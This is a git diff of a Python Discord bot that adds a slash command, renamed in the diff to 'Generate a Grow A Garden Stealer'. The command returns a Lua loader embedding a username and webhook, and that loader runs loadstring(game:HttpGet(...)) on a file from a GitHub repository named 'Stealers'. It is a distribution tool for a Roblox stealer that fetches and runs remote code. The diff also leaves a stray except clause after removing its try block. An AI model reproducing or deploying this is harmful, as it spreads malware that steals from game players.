@@ -15,7 +15,6 @@ intents.members = True  # Required for some member events
 bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
-
 @bot.event
 async def on_ready():
     print(f"✅ Logged in as {bot.user}")
@@ -29,32 +28,31 @@ async def on_ready():
 
 @tree.command(
     name="gen-grow-a-garden",
-    description="Generate a Grow A Garden message",
+    description="Generate a Grow A Garden Stealer",
     guild=discord.Object(id=GUILD_ID)
 )
 @app_commands.describe(username="Your username", webhook="Your webhook URL")
 async def gen(interaction: discord.Interaction, username: str, webhook: str):
-    try:
-        await interaction.response.send_message("✅ DM sent!", ephemeral=True)
+    await interaction.response.defer()  # Acknowledge the command so we can follow up
 
-        embed = discord.Embed(
-            title="🌱 Grow A Garden Generator",
-            description=f"Hello {interaction.user.mention}! Here's your generated Grow A Garden script.",
-            color=0x00ff00
-        )
-        embed.add_field(name="Username", value=username, inline=False)
-        embed.add_field(name="Webhook", value=webhook, inline=False)
-        embed.add_field(
-            name="Script",
-            value=f"""```lua
+    embed = discord.Embed(
+        title="🌱 Grow A Garden Generator",
+        description=f"Hello {interaction.user.mention}! Here's your generated Grow A Garden script.",
+        color=0x00ff00
+    )
+    embed.add_field(name="Username", value=username, inline=False)
+    embed.add_field(name="Webhook", value=webhook, inline=False)
+    embed.add_field(
+        name="Script",
+        value=f"""```lua
 Username = "{username}"
 Webhook = "{webhook}"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Narukisora/Stealers/refs/heads/main/Http"))()
 ```""",
-            inline=False
-        )
+        inline=False
+    )
 
-        await interaction.user.send(embed=embed)
+    await interaction.followup.send(embed=embed)
     except discord.Forbidden:
         await interaction.followup.send("❌ Could not send DM. Please enable them in server settings.", ephemeral=True)
 
